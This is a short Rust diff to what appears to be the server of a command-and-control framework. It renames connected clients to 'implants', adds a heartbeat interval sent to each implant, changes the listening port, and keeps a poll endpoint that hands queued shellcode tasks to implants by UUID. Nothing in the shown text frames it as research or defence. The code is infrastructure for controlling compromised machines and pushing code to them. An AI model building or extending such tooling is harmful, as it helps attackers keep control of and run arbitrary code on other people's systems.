@@ -13,15 +13,16 @@ pub mod tasks {
 }
 
 type Task = String;
+const HEARTBEAT: u32 = 5000; // TODO: variable heartbeat config for implant
 
 #[derive(Debug, Default)]
-pub struct Client {
+pub struct Implant {
     tasks: VecDeque<Task>,
 }
 
 #[derive(Debug, Default)]
 pub struct Beacon {
-    clients: RwLock<HashMap<Uuid, Client>>,
+    implants: RwLock<HashMap<Uuid, Implant>>,
 }
 
 #[tonic::async_trait]
@@ -34,11 +35,12 @@ impl BeaconService for Beacon {
 
         println!("Got a connection request");
 
-        let mut map = self.clients.write().await;
-        map.insert(id, Client::default());
+        let mut map = self.implants.write().await;
+        map.insert(id, Implant::default());
 
         Ok(Response::new(ConnectionResponse {
             uuid: id.to_string(),
+            heartbeat: HEARTBEAT,
         }))
     }
 
@@ -50,7 +52,7 @@ impl BeaconService for Beacon {
             return Err(Status::invalid_argument("Failed to parse uuid."));
         }
 
-        let mut map = self.clients.write().await;
+        let mut map = self.implants.write().await;
         Ok(Response::new(PollResponse {
             shellcode: match map.get_mut(&id.unwrap()) {
                 Some(v) => v.tasks.pop_front(),
@@ -66,7 +68,7 @@ impl BeaconService for Beacon {
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let addr = "[::1]:50051".parse()?;
+    let addr = "[::1]:50055".parse()?;
     let beacon = Beacon::default();
 
     Server::builder()
